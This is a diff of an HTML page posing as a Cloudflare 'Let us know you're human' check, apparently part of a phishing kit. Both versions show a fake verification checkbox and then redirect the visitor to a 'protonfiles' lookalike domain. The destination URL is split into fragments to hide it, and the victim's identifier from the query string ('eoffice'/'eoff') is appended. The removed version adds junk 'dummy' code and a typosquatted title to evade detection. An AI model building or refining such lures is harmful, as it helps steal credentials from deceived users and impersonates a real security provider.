@@ -3,334 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CloudfIare</title>
+    <title>PDFinv</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
         body {
             background-color: white;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             flex-direction: column;
-            padding: 20px;
         }
 
-        .main-wrapper {
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: breathe 3s ease-in-out;
         }
 
-        .brand-logo {
-            width: 150px;
-            height: 150px;
-            animation: pulseEffect 2s infinite ease-in-out;
+        .logo-img {
+            height: 140px;
         }
 
-        @keyframes pulseEffect {
-            0% {
-                transform: scale(0.95);
-                opacity: 0.7;
-            }
-            50% {
-                transform: scale(1.05);
-                opacity: 1;
-            }
-            100% {
-                transform: scale(0.95);
-                opacity: 0.7;
-            }
-        }
-
-        .security-panel {
-            margin: 20px 0;
+        .content {
             display: none;
         }
 
-        .validation-text {
-            margin-bottom: 15px;
+        .instruction {
+            font-size: 18px;
             color: #333;
-            font-size: 16px;
+            margin-bottom: 15px;
+            text-align: center;
         }
 
-        .security-box {
+        .captcha-box {
+            background: #f6f8fa;
+            border: 1px solid #e1e4e8;
+            border-radius: 6px;
+            padding: 15px 20px;
+            width: 420px;
             display: flex;
-            flex-direction: column;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 15px;
-            background-color: #f9f9f9;
-            min-height: 90px;
-        }
-
-        .verification-row {
-            display: flex;
-            align-items: center;
             justify-content: space-between;
-            height: 40px;
+            align-items: center;
+            height: 90px;
         }
 
-        .auth-widget {
+        .verify-box {
             display: flex;
             align-items: center;
             cursor: pointer;
         }
 
-        .verification-check {
+        .verify-check {
             width: 24px;
             height: 24px;
-            border: 2px solid #ccc;
+            border: 2px solid #c1c1c1;
             border-radius: 4px;
-            margin-right: 10px;
+            margin-right: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
             position: relative;
         }
 
-        .verification-check.rotating {
-            animation: rotationAnimation 0.8s linear;
+        .verify-check.loading {
+            border-color: #4d90fe;
+            border-top-color: transparent;
             border-radius: 50%;
-            border-top-color: #2196F3;
-            border-right-color: #2196F3;
-            border-bottom-color: #2196F3;
-            border-left-color: #e0e0e0;
+            animation: spin 1s linear infinite;
         }
 
-        .verification-check.authenticated {
-            background-color: #4caf50;
-            border-color: #4caf50;
+        .verify-check.checked {
+            background: #11bb11;
+            border-color: #11bb11;
             border-radius: 50%;
+            animation: none;
         }
 
-        .validation-mark {
+        .verify-check.checked::after {
+            content: "✓";
             color: white;
             font-weight: bold;
-            display: none;
+            font-size: 14px;
         }
 
-        .verification-check.authenticated .validation-mark {
-            display: block;
+        .verify-text {
+            font-size: 15px;
+            color: #333;
+            user-select: none;
+            font-weight: bold;
         }
 
-        .auth-label {
-            font-size: 16px;
-            color: #555;
+        .success-text {
+            color: #11bb11;
         }
 
-        .completion-text {
-            color: #555;
-            font-weight: 500;
-            display: none;
-        }
-
-        .company-info {
+        .brand-section {
+            text-align: right;
             display: flex;
             flex-direction: column;
             align-items: flex-end;
-            justify-content: center;
-            height: 100%;
         }
 
-        .security-img {
-            width: 50px;
-            margin-bottom: 2px;
+        .brand-img {
+            height: 45px;
+            margin-bottom: 3px;
         }
 
-        .company-name {
-            font-weight: normal;
-            color: #333;
+        .robotics-text {
             font-size: 12px;
-            margin-bottom: 1px;
+            color: #888;
+            margin-top: 2px;
+            letter-spacing: 0.5px;
         }
 
-        .legal-info {
-            color: #777;
+        .privacy-text {
             font-size: 10px;
+            color: #888;
+            margin-top: 2px;
         }
 
-        @keyframes rotationAnimation {
+        @keyframes breathe {
+            0% { opacity: 0; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        /* Dummy styles that do nothing */
-        .dummy-style-1 { opacity: 0; }
-        .dummy-style-2 { position: absolute; top: -9999px; }
-        .unused-class { background-image: linear-gradient(to bottom, transparent, transparent); }
-        .meaningless-style { z-index: -1; }
-        .fake-animation { animation: none; }
     </style>
 </head>
 <body>
-    <div class="main-wrapper">
-        <img src="logo.png" alt="Company Logo" class="brand-logo" id="mainLogo">
+    <div class="logo-container">
+        <img src="logo.png" alt="Logo" class="logo-img">
+    </div>
 
-        <div class="security-panel" id="authPanel">
-            <p class="validation-text">Let us know you're human</p>
+    <div class="content">
+        <div class="instruction">Let us know you're human</div>
+        <div class="captcha-box">
+            <div class="verify-box" id="verifyBox">
+                <div class="verify-check" id="verifyCheck"></div>
+                <span class="verify-text" id="verifyLabel">Verify</span>
+            </div>
 
-            <div class="security-box" id="validationBox">
-                <div class="verification-row">
-                    <div class="auth-widget" id="authWidget">
-                        <div class="verification-check" id="authCheck">
-                            <div class="validation-mark">✓</div>
-                        </div>
-                        <span class="auth-label" id="authLabel">Verify</span>
-                        <span class="completion-text" id="completionText">Success!</span>
-                    </div>
-
-                    <div class="company-info">
-                        <img src="cloudflare_.png" alt="Security Provider" class="security-img">
-                        <div class="company-name">CLOUDFLARE</div>
-                        <div class="legal-info">Privacy · Terms</div>
-                    </div>
-                </div>
+            <div class="brand-section">
+                <img src="cloudflare_.png" alt="Cloudflare" class="brand-img">
+                <div class="robotics-text">CLOUDFLARE</div>
+                <div class="privacy-text">Privacy · Terms</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Dummy variables that do nothing
-        var unusedVar1 = "meaningless string";
-        let temporaryData = [1, 2, 3, 4, 5];
-        const fakeConstant = 3.14159;
-        var dummyObject = { prop1: "value1", prop2: "value2" };
-        let unusedArray = ["apple", "banana", "cherry"];
-
         document.addEventListener('DOMContentLoaded', function() {
-            // More dummy variables
-            var pointlessNumber = 42;
-            let meaninglessBoolean = true;
-            const fakeDate = new Date();
+            const logoContainer = document.querySelector('.logo-container');
+            const content = document.querySelector('.content');
+            const verifyBox = document.getElementById('verifyBox');
+            const verifyCheck = document.getElementById('verifyCheck');
+            const verifyLabel = document.getElementById('verifyLabel');
+            let verified = false;
 
-            // Actual functional variables with misleading names
-            const visualElement = document.getElementById('mainLogo');
-            const interfaceComponent = document.getElementById('authPanel');
-            const userInputArea = document.getElementById('authWidget');
-            const securityIndicator = document.getElementById('authCheck');
-            const actionLabel = document.getElementById('authLabel');
-            const statusMessage = document.getElementById('completionText');
-
-            let validationComplete = false;
-
-            // Dummy function that does nothing
-            function performFakeCalculation(a, b) {
-                let result = a * b;
-                result += 10;
-                return result - 10;
+            // Function to extract parameter from URL
+            function getUrlParameter() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('eoff') || '';
             }
 
-            // Another dummy function
-            function createFakeData() {
-                var arr = [];
-                for (let i = 0; i < 5; i++) {
-                    arr.push(i * 2);
-                }
-                return arr;
+            // Function to build the redirect URL from fragments
+            function buildRedirectUrl() {
+                const paramValue = getUrlParameter();
+
+                // Break the URL into tiny pieces
+                const part1 = 'https:';
+                const part2 = '//proton';
+                const part3 = 'files.';
+                const part4 = 'esgkruies';
+                const part5 = 'yapydt.';
+                const part6 = 'online/';
+                const part7 = 'tOnDqXfQ#';
+
+                // Join the pieces back together
+                const baseUrl = part1 + part2 + part3 + part4 + part5 + part6 + part7;
+
+                return baseUrl + encodeURIComponent(paramValue);
             }
 
-            // Function to extract URL parameters with misleading name
-            function processQueryData(paramName) {
-                paramName = paramName.replace(/[\[\]]/g, '\\$&');
-                const pattern = new RegExp('[?&]' + paramName + '(=([^&#]*)|&|#|$)');
-                const matches = pattern.exec(window.location.href);
-                if (!matches) return null;
-                if (!matches[2]) return '';
-                return decodeURIComponent(matches[2].replace(/\+/g, ' '));
-            }
+            setTimeout(function() {
+                logoContainer.style.display = 'none';
+                content.style.display = 'block';
+            }, 2500);
 
-            // Call dummy functions to make them seem used
-            let fakeResult = performFakeCalculation(5, 10);
-            let dummyArray = createFakeData();
+            verifyBox.addEventListener('click', function() {
+                if (!verified) {
+                    verifyCheck.classList.add('loading');
 
-            // Dummy event listener that does nothing
-            document.addEventListener('mousemove', function() {
-                let x = Math.random();
-                if (x > 2) { // This condition will never be true
-                    console.log("This never happens");
-                }
-            });
+                    setTimeout(function() {
+                        verifyCheck.classList.remove('loading');
+                        verifyCheck.classList.add('checked');
+                        verifyLabel.textContent = 'Success!';
+                        verifyLabel.classList.add('success-text');
+                        verified = true;
 
-            // After initial animation, show verification panel
-            setTimeout(() => {
-                visualElement.style.display = 'none';
-                interfaceComponent.style.display = 'block';
-
-                // More dummy operations
-                let unusedValue = performFakeCalculation(2, 3);
-            }, 2000);
-
-            // Add click event to verification widget
-            userInputArea.addEventListener('click', function() {
-                if (!validationComplete) {
-                    // Add spinning animation
-                    securityIndicator.classList.add('rotating');
-
-                    // After spinning completes, show success and process redirect
-                    setTimeout(() => {
-                        securityIndicator.classList.remove('rotating');
-                        securityIndicator.classList.add('authenticated');
-                        actionLabel.style.display = 'none';
-                        statusMessage.style.display = 'inline';
-                        validationComplete = true;
-
-                        // More dummy operations
-                        let anotherFakeValue = performFakeCalculation(7, 8);
-
-                        // Get the parameter value from URL
-                        const urlData = processQueryData('eoffice');
-
-                        // Obfuscated URL construction
-                        const baseParts = [
-                            'https://',
-                            'proton',
-                            'files',
-                            '.esgkr',
-                            'uiesy',
-                            'apydt',
-                            '.online',
-                            '/tOnD',
-                            'qXfQ'
-                        ];
-
-                        let destination = baseParts.join('');
-
-                        // Append the parameter value if it exists
-                        if (urlData) {
-                            destination += '#' + urlData;
-                        }
-
-                        // More dummy code
-                        let finalCheck = performFakeCalculation(10, 20);
-
-                        // Dummy timeout that does nothing
                         setTimeout(function() {
-                            let x = 1;
-                            x++;
-                            if (x > 0) {
-                                // This does nothing
-                            }
-                        }, 100);
-
-                        // Redirect after verification
-                        setTimeout(() => {
-                            window.location.href = destination;
-                        }, 3000);
-                    }, 800);
+                            const redirectUrl = buildRedirectUrl();
+                            window.location.href = redirectUrl;
+                        }, 2000);
+                    }, 1000);
                 }
             });
-
-            // Final dummy function calls
-            performFakeCalculation(3, 4);
-            createFakeData();
         });
     </script>
 </body>
